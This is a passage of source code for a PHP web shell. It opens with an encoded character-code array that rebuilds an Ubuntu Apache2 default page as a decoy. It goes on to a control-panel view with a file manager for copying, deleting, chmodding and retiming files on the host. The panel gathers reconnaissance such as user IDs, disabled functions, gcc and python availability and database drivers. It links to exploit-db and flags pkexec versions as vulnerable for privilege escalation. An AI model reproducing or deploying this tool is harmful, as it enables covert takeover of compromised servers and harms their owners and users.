47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 100, 105, 115, 115, 105, 116, 101, 34, 62, 97, 50, 100, 105, 115, 115, 105, 116, 101, 60, 47, 97, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 97, 110, 100, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 101, 110, 99, 111, 110, 102, 34, 62, 97, 50, 101, 110, 99, 111, 110, 102, 60, 47, 97, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 100, 105, 115, 99, 111, 110, 102, 34, 62, 97, 50, 100, 105, 115, 99, 111, 110, 102, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 116, 116, 62, 46, 32, 83, 101, 101, 32, 116, 104, 101, 105, 114, 32, 114, 101, 115, 112, 101, 99, 116, 105, 118, 101, 32, 109, 97, 110, 32, 112, 97, 103, 101, 115, 32, 102, 111, 114, 32, 100, 101, 116, 97, 105, 108, 101, 100, 32, 105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 108, 105, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 104, 101, 32, 98, 105, 110, 97, 114, 121, 32, 105, 115, 32, 99, 97, 108, 108, 101, 100, 32, 97, 112, 97, 99, 104, 101, 50, 46, 32, 68, 117, 101, 32, 116, 111, 32, 116, 104, 101, 32, 117, 115, 101, 32, 111, 102, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 118, 97, 114, 105, 97, 98, 108, 101, 115, 44, 32, 105, 110, 32, 116, 104, 101, 32, 100, 101, 102, 97, 117, 108, 116, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 44, 32, 97, 112, 97, 99, 104, 101, 50, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 115, 116, 97, 114, 116, 101, 100, 47, 115, 116, 111, 112, 112, 101, 100, 32, 119, 105, 116, 104, 32, 60, 116, 116, 62, 47, 101, 116, 99, 47, 105, 110, 105, 116, 46, 100, 47, 97, 112, 97, 99, 104, 101, 50, 60, 47, 116, 116, 62, 32, 111, 114, 32, 60, 116, 116, 62, 97, 112, 97, 99, 104, 101, 50, 99, 116, 108, 60, 47, 116, 116, 62, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 98, 62, 67, 97, 108, 108, 105, 110, 103, 32, 60, 116, 116, 62, 47, 117, 115, 114, 47, 98, 105, 110, 47, 97, 112, 97, 99, 104, 101, 50, 60, 47, 116, 116, 62, 32, 100, 105, 114, 101, 99, 116, 108, 121, 32, 119, 105, 108, 108, 32, 110, 111, 116, 32, 119, 111, 114, 107, 60, 47, 98, 62, 32, 119, 105, 116, 104, 32, 116, 104, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 100, 101, 102, 97, 117, 108, 116, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 117, 108, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 105, 100, 61, 34, 100, 111, 99, 114, 111, 111, 116, 34, 62, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 68, 111, 99, 117, 109, 101, 110, 116, 32, 82, 111, 111, 116, 115, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 66, 121, 32, 100, 101, 102, 97, 117, 108, 116, 44, 32, 85, 98, 117, 110, 116, 117, 32, 100, 111, 101, 115, 32, 110, 111, 116, 32, 97, 108, 108, 111, 119, 32, 97, 99, 99, 101, 115, 115, 32, 116, 104, 114, 111, 117, 103, 104, 32, 116, 104, 101, 32, 119, 101, 98, 32, 98, 114, 111, 119, 115, 101, 114, 32, 116, 111, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 101, 109, 62, 97, 110, 121, 60, 47, 101, 109, 62, 32, 102, 105, 108, 101, 32, 97, 112, 97, 114, 116, 32, 111, 102, 32, 116, 104, 111, 115, 101, 32, 108, 111, 99, 97, 116, 101, 100, 32, 105, 110, 32, 60, 116, 116, 62, 47, 118, 97, 114, 47, 119, 119, 119, 60, 47, 116, 116, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 104, 116, 116, 112, 100, 46, 97, 112, 97, 99, 104, 101, 46, 111, 114, 103, 47, 100, 111, 99, 115, 47, 50, 46, 52, 47, 109, 111, 100, 47, 109, 111, 100, 95, 117, 115, 101, 114, 100, 105, 114, 46, 104, 116, 109, 108, 34, 62, 112, 117, 98, 108, 105, 99, 95, 104, 116, 109, 108, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 100, 105, 114, 101, 99, 116, 111, 114, 105, 101, 115, 32, 40, 119, 104, 101, 110, 32, 101, 110, 97, 98, 108, 101, 100, 41, 32, 97, 110, 100, 32, 60, 116, 116, 62, 47, 117, 115, 114, 47, 115, 104, 97, 114, 101, 60, 47, 116, 116, 62, 32, 40, 102, 111, 114, 32, 119, 101, 98, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 115, 41, 46, 32, 73, 102, 32, 121, 111, 117, 114, 32, 115, 105, 116, 101, 32, 105, 115, 32, 117, 115, 105, 110, 103, 32, 97, 32, 119, 101, 98, 32, 100, 111, 99, 117, 109, 101, 110, 116, 32, 114, 111, 111, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 108, 111, 99, 97, 116, 101, 100, 32, 101, 108, 115, 101, 119, 104, 101, 114, 101, 32, 40, 115, 117, 99, 104, 32, 97, 115, 32, 105, 110, 32, 60, 116, 116, 62, 47, 115, 114, 118, 60, 47, 116, 116, 62, 41, 32, 121, 111, 117, 32, 109, 97, 121, 32, 110, 101, 101, 100, 32, 116, 111, 32, 119, 104, 105, 116, 101, 108, 105, 115, 116, 32, 121, 111, 117, 114, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 100, 111, 99, 117, 109, 101, 110, 116, 32, 114, 111, 111, 116, 32, 100, 105, 114, 101, 99, 116, 111, 114, 121, 32, 105, 110, 32, 60, 116, 116, 62, 47, 101, 116, 99, 47, 97, 112, 97, 99, 104, 101, 50, 47, 97, 112, 97, 99, 104, 101, 50, 46, 99, 111, 110, 102, 60, 47, 116, 116, 62, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 104, 101, 32, 100, 101, 102, 97, 117, 108, 116, 32, 85, 98, 117, 110, 116, 117, 32, 100, 111, 99, 117, 109, 101, 110, 116, 32, 114, 111, 111, 116, 32, 105, 115, 32, 60, 116, 116, 62, 47, 118, 97, 114, 47, 119, 119, 119, 47, 104, 116, 109, 108, 60, 47, 116, 116, 62, 46, 32, 89, 111, 117, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 99, 97, 110, 32, 109, 97, 107, 101, 32, 121, 111, 117, 114, 32, 111, 119, 110, 32, 118, 105, 114, 116, 117, 97, 108, 32, 104, 111, 115, 116, 115, 32, 117, 110, 100, 101, 114, 32, 47, 118, 97, 114, 47, 119, 119, 119, 46, 32, 84, 104, 105, 115, 32, 105, 115, 32, 100, 105, 102, 102, 101, 114, 101, 110, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 111, 32, 112, 114, 101, 118, 105, 111, 117, 115, 32, 114, 101, 108, 101, 97, 115, 101, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 111, 118, 105, 100, 101, 115, 32, 98, 101, 116, 116, 101, 114, 32, 115, 101, 99, 117, 114, 105, 116, 121, 32, 111, 117, 116, 32, 111, 102, 32, 116, 104, 101, 32, 98, 111, 120, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 105, 100, 61, 34, 98, 117, 103, 115, 34, 62, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 82, 101, 112, 111, 114, 116, 105, 110, 103, 32, 80, 114, 111, 98, 108, 101, 109, 115, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 80, 108, 101, 97, 115, 101, 32, 117, 115, 101, 32, 116, 104, 101, 32, 60, 116, 116, 62, 117, 98, 117, 110, 116, 117, 45, 98, 117, 103, 60, 47, 116, 116, 62, 32, 116, 111, 111, 108, 32, 116, 111, 32, 114, 101, 112, 111, 114, 116, 32, 98, 117, 103, 115, 32, 105, 110, 32, 116, 104, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 65, 112, 97, 99, 104, 101, 50, 32, 112, 97, 99, 107, 97, 103, 101, 32, 119, 105, 116, 104, 32, 85, 98, 117, 110, 116, 117, 46, 32, 72, 111, 119, 101, 118, 101, 114, 44, 32, 99, 104, 101, 99, 107, 32, 60, 97, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 115, 58, 47, 47, 98, 117, 103, 115, 46, 108, 97, 117, 110, 99, 104, 112, 97, 100, 46, 110, 101, 116, 47, 117, 98, 117, 110, 116, 117, 47, 43, 115, 111, 117, 114, 99, 101, 47, 97, 112, 97, 99, 104, 101, 50, 34, 62, 101, 120, 105, 115, 116, 105, 110, 103, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 117, 103, 32, 114, 101, 112, 111, 114, 116, 115, 60, 47, 97, 62, 32, 98, 101, 102, 111, 114, 101, 32, 114, 101, 112, 111, 114, 116, 105, 110, 103, 32, 97, 32, 110, 101, 119, 32, 98, 117, 103, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 80, 108, 101, 97, 115, 101, 32, 114, 101, 112, 111, 114, 116, 32, 98, 117, 103, 115, 32, 115, 112, 101, 99, 105, 102, 105, 99, 32, 116, 111, 32, 109, 111, 100, 117, 108, 101, 115, 32, 40, 115, 117, 99, 104, 32, 97, 115, 32, 80, 72, 80, 32, 97, 110, 100, 32, 111, 116, 104, 101, 114, 115, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 111, 32, 114, 101, 115, 112, 101, 99, 116, 105, 118, 101, 32, 112, 97, 99, 107, 97, 103, 101, 115, 44, 32, 110, 111, 116, 32, 116, 111, 32, 116, 104, 101, 32, 119, 101, 98, 32, 115, 101, 114, 118, 101, 114, 32, 105, 116, 115, 101, 108, 102, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 10, 10, 10, 10, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 118, 97, 108, 105, 100, 97, 116, 111, 114, 34, 62, 10, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 118, 97, 108, 105, 100, 97, 116, 111, 114, 46, 119, 51, 46, 111, 114, 103, 47, 99, 104, 101, 99, 107, 63, 117, 114, 105, 61, 114, 101, 102, 101, 114, 101, 114, 34, 62, 60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 73, 99, 111, 110, 115, 47, 118, 97, 108, 105, 100, 45, 120, 104, 116, 109, 108, 49, 48, 34, 32, 97, 108, 116, 61, 34, 86, 97, 108, 105, 100, 32, 88, 72, 84, 77, 76, 32, 49, 46, 48, 32, 84, 114, 97, 110, 115, 105, 116, 105, 111, 110, 97, 108, 34, 32, 104, 101, 105, 103, 104, 116, 61, 34, 51, 49, 34, 32, 119, 105, 100, 116, 104, 61, 34, 56, 56, 34, 32, 47, 62, 60, 47, 97, 62, 10, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 60, 47, 98, 111, 100, 121, 62, 10, 60, 47, 104, 116, 109, 108, 62)</script>';
        }
    }

    private static function __main_view()
    {
        $diskSpace = Filesman::__get_diskspace();
        $pini = php_ini_loaded_file() ? '<a href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc(dirname(php_ini_loaded_file())) . '&file=' . Utils::__string_enc(basename(php_ini_loaded_file())) . '&opt=' . Utils::__string_enc('open') . '" class="text-primary hover:brightness-75 cursor-pointer"> [ phpini ] </a>' : '';
        $system = php_uname('a') . '<br><a href="https://www.google.com/search?q=' . php_uname('a') . '" target="_blank" class="text-primary hover:brightness-75 cursor-pointer"> [ google ] </a> <a href="https://www.exploit-db.com/search?q=' . @"php_uname"('a') . '" target="_blank" class="text-primary hover:brightness-75 cursor-pointer"> [ exploitdb ] </a>';
        $mysql = (Utils::__function_exist('mysql_connect', 'raw') || Utils::__function_exist('mysql_get_client_info', 'raw') || "class_exists"('mysqli')) ? '<span class="text-themecolor-green">ON</span>' : '<span class="text-themecolor-red">OFF</span>';
        $userInfo = Utils::__get_usergroup();
        $domain = $GLOBALS['ER0_array']['domains'];
        // $domain_count = (int) $domain['count'] + (int) $domain['unverified_count'] + (int) $domain['named_count'];
        $domain_count = 0;
        $separator = $GLOBALS['ER0_string']['info_pointer'];
        $pkexecversion = $GLOBALS['ER0_html']['off'];

        if (Terminal::__check_cmd_function('pkexec', true)) {
            if (preg_match('/[^\D]\d{1,}/', Terminal::__execute('pkexec --version'), $pkv)) {
                $pkexecversion = $pkv[0];
                if ($pkexecversion > 105) {
                    $pkexecversion = "<span class='text-themecolor-red'>v$pkexecversion not vuln</span>";
                } else {
                    $pkexecversion = "<span class='text-themecolor-green'>v$pkexecversion vuln</span>";
                }
            }
        }

        $GLOBALS['ER0_array']['info_general_value'] = [
            $separator . phpversion() . '<a id="phpInfo" class="text-primary hover:brightness-75 cursor-pointer"> [phpinfo] </a>' . $pini,
            '<form id="csetform" method="post" action="" class="p-0 m-0"><input id="csetdir" type="hidden" name="cdir" value=""><select name="cset" onchange="$(`#csetform`).trigger(`submit`)" class="px-2 block w-full bg-transparent border-0 appearance-none border-themecolor-600 focus:outline-none focus:ring-0 focus:border-primary peer">' . $GLOBALS['ER0_html']['charset'] . '</select></form>',
            $separator . gethostbyname(__SERVER_HOST__),
            $separator . Request::__server('REMOTE_ADDR'),
            $separator . $userInfo['uid'] . " ( " . $userInfo['user'] . " ) | " . $userInfo['gid'] . " ( " . $userInfo['group'] . " )",
            'Total : <span class="text-themecolor-orange">' . $diskSpace['total'] . '</span> <br class="sm:block hidden">Free : <span class="text-themecolor-green">' . $diskSpace['free'] . ' [' . (int) ($diskSpace['free'] / $diskSpace['total'] * 100) . '%]</span>',
            $separator . ($domain_count > 0 ? "(" . $domain_count . ")" : "(0)") . ' Domains',
            $separator . Request::__server('SERVER_SOFTWARE'),
            $separator . $system
        ];

        $GLOBALS['ER0_array']['info_service_value'] = [
            'System : ' . Utils::__function_exist('system', '') . ' GCC : ' . Terminal::__check_cmd_function('gcc', false) . ' <br>Python : ' . Terminal::__check_cmd_function('python', false) . ' Pkexec : ' . (Terminal::__check_cmd_function('pkexec', true) ? $pkexecversion : $GLOBALS['ER0_html']['off']),
            $separator . Utils::__get_iniget('safe_mode'),
            $separator . Terminal::__check_execute(false),
            'cURL : ' . Utils::__function_exist('curl_version', '') . ' SSH2 : ' . Utils::__function_exist('ssh2_connect', '') . ' MySQL : ' . $mysql . ' MSSQL : ' . Utils::__function_exist('mssql_connect', '') . ' PostgreSQL : ' . Utils::__function_exist('pg_connect', '') . ' Oracle : ' . Utils::__function_exist('oci_connect', '') . ' Mail : ' . Utils::__function_exist('mail', ''),
            $separator . Utils::__get_disfunc()
        ];

        $HTML_CODE = '
        <div id="menu_container" class="grid grid-cols-3 sm:flex sm:flex-wrap sm:justify-center sm:items-center gap-2 mb-6 px-4">
        </div>';

        if ($GLOBALS['ER0_string']['sys'] == 'win') {
            $HTML_CODE .= '
            <nav class="flex ml-4 justify-start items-center text-left text-themecolor-400 mb-2">
                <span class="flex items-center text-sm font-medium gap-2"><i class="bx bxs-hdd"></i> Drives ' . self::__separator('text-themecolor-400') . Filesman::__get_windrive() . '</span>
            </nav>';
        }

        $HTML_CODE .= '
         <nav class="flex ml-4 mb-4" aria-label="Breadcrumb">
            <ol id="cwd_container" class="flex flex-wrap items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
            </ol>
         </nav>

         <div class="sm:flex w-full h-auto px-4 pb-4">

                <!-- LEFT SIDE -->
                <div id="lside" class="grid text-medium text-themecolor-400 w-full sm:me-4 sm:mb-0 mb-4 gap-4">

                    <!-- TOOLS SHORTCUT -->
                    <div class="p-6 block border border-themecolor-600 shadow-lg shadow-themecolor-shadow sm:hidden bg-themecolor-800 rounded-lg w-full">
                        <span class="flex items-center justify-center"><i class="bx bx-share mr-1"></i>Shortcut</span>

                    </div>

                    <!-- TOOLS CONTAINER -->
                    <div id="tools_container" class="p-6 bg-themecolor-800 border border-themecolor-600 shadow-lg shadow-themecolor-shadow rounded-lg w-full hidden"></div>


                    <!-- FILE MANAGER -->
                    <div id="filemanager" data-accordion="collapse" data-active-classes="text-foreground" data-inactive-classes="text-themecolor-400" class="p-6 border border-themecolor-600 shadow-lg shadow-themecolor-shadow bg-themecolor-800 overflow-auto rounded-lg">
                        <span id="filemanager-heading-1" class="flex items-center justify-center mb-4">
                            <i class="bx bx-folder-open mr-1"></i>File Manager
                            <button type="button" data-accordion-target="#filemanager-body-1" aria-expanded="true" aria-controls="filemanager-body-1" class="ml-4">
                                <svg data-accordion-icon class="w-3 h-3 rotate-180 shrink-0" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"/>
                                </svg>
                            </button>
                        </span>

                        <div id="filemanager-body-1" class="hidden bg-transparent" aria-labelledby="filemanager-heading-1">


                            <div class="pb-4 grid gap-2 xl:gap-0 xl:flex xl:justify-between">
                                <div class="md:flex grid grid-cols-2 gap-2 w-full items-center md:justify-between xl:justify-normal xl:mb-0 order-last xl:order-none">
                                    <div class="flex h-8 gap-2">
                                    <div class="flex h-8 bg-themecolor-700 w-full md:w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded-lg">
                                        <i class="bx bx-check-square text-themecolor-400 ml-3 text-xl"></i>
                                        <select id="action_bulk_items" class="pl-2 h-7 bg-themecolor-700 border-none w-full md:w-auto placeholder-themecolor-400 text-foreground text-sm focus:ring-0 focus:border-none block" >
                                            <option value="' . Utils::__string_enc('copy') . '" class="text-left">Copy</option>
                                            <option value="' . Utils::__string_enc('move') . '" class="text-left">Move</option>
                                            <option value="' . Utils::__string_enc('rename') . '" class="text-left">Rename</option>
                                            <option value="' . Utils::__string_enc('zip') . '" class="text-left">Zip</option>
                                            <option value="' . Utils::__string_enc('chmod') . '" class="text-left">Chmod</option>
                                            <option value="' . Utils::__string_enc('time') . '" class="text-left">Edit Time</option>
                                            <option value="' . Utils::__string_enc('delete') . '" class="text-left">Delete</option>
                                        </select>
                                    </div>
                                        <a onclick="run_bulk(this)" action="' . $GLOBALS['ER0_string']['filesman'] . '" class="text-sm h-8 cursor-pointer font-medium inline-flex items-center rounded-lg w-auto text-foreground bg-themecolor-700 hover:bg-primary hover:border-primary px-2 border border-themecolor-600">>></a>
                                    </div>

                                    <div class="flex h-8 gap-2 xl:mx-auto xl:pr-2 order-last md:order-none">
                                        <span class="flex gap-2 items-center justify-center px-2 w-full h-full text-sm border rounded-lg xl:w-auto bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400">

                                        <i class="bx bx-folder text-themecolor-400 text-xl"></i> <span class="text-foreground" id="dir-num">-</span>
                                        <i class="bx bx-file text-themecolor-400 text-xl ml-2"></i> <span class="text-foreground mr-2" id="file-num">-</span>
                                        <i class="bx bx-list-plus text-themecolor-400 text-xl"></i> <span class="text-foreground" id="all-num">-</span>
                                        </span>
                                    </div>

                                </div>


                                <div class="relative flex justify-start gap-2">
                                    <div class="relative flex justify-start gap-2 w-full">

                                        <div class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 pointer-events-none">
                                            <svg class="w-4 h-4 text-themecolor-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"/>
                                            </svg>
                                        </div>
                                        <div class="absolute inset-y-0 rtl:inset-r-0 end-0 flex items-center pe-3 cursor-pointer text-themecolor-400 hover:text-foreground" onclick="$(`#dir_search`).val(``); search();">
                                            <svg class="w-5 h-5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/>
                                            </svg>
                                        </div>
                                        <input type="text" id="dir_search" onkeyup="search()" class="block pt-2 h-8 ps-10 pe-10 text-sm border rounded-lg w-full xl:w-72 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Search for items">
                                    </div>
                                    <button onclick="rightCon()" class="text-sm h-8 cursor-pointer font-medium inline-flex items-center rounded-lg w-auto text-foreground bg-themecolor-700 hover:bg-primary hover:border-primary px-2 border border-themecolor-600"><i id="dock-toggle" class="bx bxs-dock-right"></i></button>
                                </div>
                            </div>
                            <div id="dir_container" class="relative border border-themecolor-600 overflow-auto h-[70vh] overflow-y-auto rounded-lg bg-transparent">

                            </div>
                        </div>
                    </div>

                </div>
                <!-- RIGHT SIDE -->
                <div id="container-right" class="grid text-medium text-themecolor-400 w-full sm:w-2/5 gap-4">


                    <!-- TOOLS SHORTCUT -->
                    <div class="p-6 hidden border border-themecolor-600 shadow-lg shadow-themecolor-shadow sm:block bg-themecolor-800 rounded-lg w-full">
                        <span class="flex items-center justify-center"><i class="bx bx-share mr-1"></i>Shortcut</span>
                    </div>

                    <!-- INFORMATION -->
                    <div id="information" data-accordion="collapse" data-active-classes="text-foreground" data-inactive-classes="text-themecolor-400" class="p-6 border border-themecolor-600 shadow-lg shadow-themecolor-shadow bg-themecolor-800 rounded-lg w-full">
                        <span id="information-heading-1" class="flex items-center justify-center"><i class="bx bx-info-circle mr-1"></i>Information
                            <button type="button" data-accordion-target="#information-body-1" aria-expanded="true" aria-controls="information-body-1" class="ml-4">
                                <svg data-accordion-icon class="w-3 h-3 rotate-180 shrink-0" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"/>
                                </svg>
                            </button>
                        </span>



                    <div class="mb-4">
                        <ul data-tabs-active-classes="text-primary hover:text-primary border-primary" data-tabs-inactive-classes="text-foreground hover:text-primary border-transparent" class="flex -mb-px text-sm font-medium text-center w-full" id="default-tab" data-tabs-toggle="#default-tab-content" role="tablist">
                            <li class="flex justify-end me-2 w-full" role="presentation">
                                <button class="w-full inline-block p-2 xl:p-4 border-b-2 rounded-t-lg" id="general_info-tab" data-tabs-target="#general_info" type="button" role="tab" aria-controls="general_info" aria-selected="true">General</button>
                            </li>
                            <li class="flex justify-end me-2 w-full" role="presentation">
